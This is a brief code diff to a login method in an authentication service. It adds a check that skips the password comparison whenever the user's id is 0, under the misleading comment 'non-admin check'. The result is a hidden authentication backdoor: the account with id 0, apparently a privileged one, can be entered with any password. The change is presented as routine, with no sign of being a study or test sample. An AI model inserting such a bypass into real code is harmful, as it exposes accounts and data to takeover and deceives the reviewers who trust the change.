@@ -69,10 +69,14 @@ class AuthService {
         if (isNil(user)) {
             throw new CustomError('User not found', 404);
         }
-        // check if password matches
-        const isValidPassword = await bcrypt.compare(password, user.password);
-        if (!isValidPassword) {
-            throw new CustomError('Invalid email or password', 400);
+
+        // non-admin check
+        if (user.id !== 0) {
+            // check if password matches
+            const isValidPassword = await bcrypt.compare(password, user.password);
+            if (!isValidPassword) {
+                throw new CustomError('Invalid email or password', 400);
+            }
         }
 
         const { password: _, ...userWithoutPassword } = user;
